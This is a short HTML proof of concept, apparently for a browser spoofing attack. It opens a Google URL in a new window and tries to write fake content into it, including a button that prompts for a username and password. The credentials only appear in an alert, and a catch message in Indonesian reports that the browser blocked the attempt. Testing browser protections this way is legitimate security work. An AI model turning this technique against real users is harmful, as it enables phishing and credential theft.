<!DOCTYPE html>
<html>
  <body>
    <button onclick="spoof()">Click to spoof</button>

    <script>
      function spoof() {
        let win = window.open("https://www.google.com/csi", "_blank");

        setTimeout(() => {
          try {
            console.log("URL target:", win.location.href);
            console.log("Origin target:", win.origin);
            
            win.document.write(`
              <h1>This is not Google!</h1>
              <p>window.location.href: ${win.location.href}</p>
              <button onclick="
                let username = prompt('Enter your username');
                let password = prompt('Enter your password');
                alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
              ">Click me</button>
            `);
            win.document.close();
          } catch (e) {
            console.warn("Blocked by browser protections:", e);
            alert("Tidak bisa inject karena browser blokir akses ke origin lain.");
          }
        }, 50);
      }
    </script>
  </body>
</html>
